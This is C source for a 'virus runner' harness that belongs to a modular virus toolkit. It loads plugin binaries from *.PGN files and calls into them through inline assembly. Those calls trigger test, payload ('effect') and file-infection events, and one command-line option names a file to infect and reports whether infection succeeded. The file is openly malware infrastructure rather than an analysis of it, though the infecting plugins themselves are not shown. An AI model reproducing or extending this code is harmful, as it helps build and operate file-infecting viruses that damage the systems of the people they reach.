   // virus LOADER

   // - collect *.PGN files (LOADER.PGN first, DEBUG.PGN second)
   // - pass control to LOADER.HandleEvent (LOADER + size plugin_struc==16),
   //   EAX==EV_PENTRY_START_IN_PE

   #include <stdio.h>
   #include <stdlib.h>
   #include <dos.h>
   #include <dir.h>
   #include <io.h>
   #include <assert.h>

   #include "plugin.hpp"

   #define HOSTEXE_BASE            0x3800
   #define EV_TEST_ENTRY           0x3001
   #define EV_PENTRY_START_IN_PE   0x0A01
   #define EV_EFFECT_RUN_REAL      0x3602
   #define EV_INFMANX_DO_INFECT    0x3905

   #define A_DEFAULT               1
   #define A_TEST                  2
   #define A_EFFECT                3
   #define A_INFECT                4

   char*p,*q,*z;
   int count, countb;

   void loadpgn(char* fname, int fuckifnot)
   {
     printf("loading: %s              \x0D",fname);
     FILE*f=fopen(fname,"rb");
     if (fuckifnot)
       assert(f);
     else
       if (!f) return;
     int len = filelength(fileno(f));
     z=q;
     fread(q, 1,len, f);
     q += len;
     countb += len;
     fclose(f);
     count++;
   }

   void help(int t)
   {
     printf("////x////x////x////x////x////x////x////x////x////x////x////x////x////x//\n");
     printf("//                                                                    //\n");
     if (t)
     {
     printf("//                         *** W A R N I N G ***                      //\n");
     printf("//                                                                    //\n");
     printf("// HOST.EXE is a VIRUS RUNNER.                                        //\n");
     printf("// At first execution (i.e. now) 'HOST.ID' file is created.           //\n");
     printf("//                                                                    //\n");
     }
     printf("// syntax:                                                            //\n");
     printf("//   HOST.EXE [/int3] [/halt] [/test|/effect|/infect]                 //\n");
     printf("// options:                                                           //\n");
     printf("//   /int3 -- INT 3 before calling any events                         //\n");
     printf("//   /halt -- halt current thread instead of exit; exit by Ctrl+C.    //\n");
     printf("//   /test -- generate EV_TEST_ENTRY instead of EV_PENTRY_START_IN_PE //\n");
     printf("//   /effect -- generate EV_EFFECT_RUN_REAL                           //\n");
     printf("//   /infect <filename> -- generate EV_INFMANX_DO_INFECT              //\n");
     printf("//                                                                    //\n");
     printf("////x////x////x////x////x////x////x////x////x////x////x////x////x////x//\n");
     exit(0);
   }

   void main(int argc, char* argv[])
   {
     if (access("host.id",0))
     {
       FILE*f=fopen("host.id","wb");
       assert(f);
       fclose(f);
       help(1);
     }

     p = (char*)calloc(1,1048576);         // alloc + fill with 0s
     q = p;

     int opt_halt=0, opt_int3=0, action=A_DEFAULT;
     char* infectfile = 0;

     for (int i=1; i<argc; i++)
     {
       if (!stricmp(argv[i],"/?")) help(0);
       if (!stricmp(argv[i],"-?")) help(0);
       if (!stricmp(argv[i],"/h")) help(0);
       if (!stricmp(argv[i],"-h")) help(0);
       if (!stricmp(argv[i],"/int3")) opt_int3++;
       if (!stricmp(argv[i],"/halt")) opt_halt++;
       if (!stricmp(argv[i],"/test")) action=A_TEST;
       if (!stricmp(argv[i],"/effect")) action=A_EFFECT;
       if ((!stricmp(argv[i],"/infect"))&&(i+1<argc)) { action=A_INFECT; infectfile=argv[i+1]; };
     }

     count = 0, countb = 0;
     loadpgn("loader.pgn",1);
     loadpgn("debug.pgn",0);
     struct ffblk r;
     for (int done=findfirst("*.PGN", &r, FA_ARCH);
          !done;
          done=findnext(&r))
     {
       if (stricmp(r.ff_name,"loader.pgn"))
       if (stricmp(r.ff_name,"debug.pgn"))
         loadpgn(r.ff_name,1);
     }

     if (count)
     {
       printf("total: %i plugins, %i bytes\n", count, countb);
       int c_event = EV_PENTRY_START_IN_PE;
       switch (action) {
         case A_TEST:     c_event = EV_TEST_ENTRY; break;
         case A_EFFECT:   c_event = EV_EFFECT_RUN_REAL; break;
       }
       switch (action) {
         case A_DEFAULT:  printf("þ action: default (EV_PENTRY_START_IN_PE)\n"); break;
         case A_TEST:     printf("þ action: test (EV_TEST_ENTRY)\n"); break;
         case A_EFFECT:   printf("þ action: effect (EV_EFFECT_RUN_REAL)\n"); break;
         case A_INFECT:   printf("þ action: prepare to infect (EV_PENTRY_START_IN_PE)\n"); break;
       }
       printf("executing...\n");
       fflush(stdout);
       if (opt_int3) __emit__(0xCC);
       asm
       {
         pusha
         mov eax, c_event
         or  eax, HOSTEXE_BASE shl 8
         mov ebp, p
         add ebp, 16               // sizeof(plugin_struc)  -- pgnstart.inc
         call ebp
         popa
       }
       printf("done\n");
       if ((action==A_INFECT)&&infectfile)
       {
         printf("þ action: infect (EV_INFMANX_DO_INFECT, '%s')\n", infectfile);
         int res;
         printf("executing...\n");
         fflush(stdout);
         if (opt_int3) __emit__(0xCC);
         asm
         {
           pusha
           mov eax, (HOSTEXE_BASE shl 8) + EV_INFMANX_DO_INFECT
           mov edx, infectfile
           mov ebp, p
           add ebp, 16  // sizeof(plugin_struc)
           call ebp
           mov [esp+7*4], eax
           popa
           mov res, eax
         }
         printf("result=%i, %s\n", res, res?"- successfully infected":"***ERROR***: not infected");
       }
       if (opt_halt)
       {
         printf("þ current thread is halted. Ctrl+C to break\n");
         while(1);
       }
     }
   }
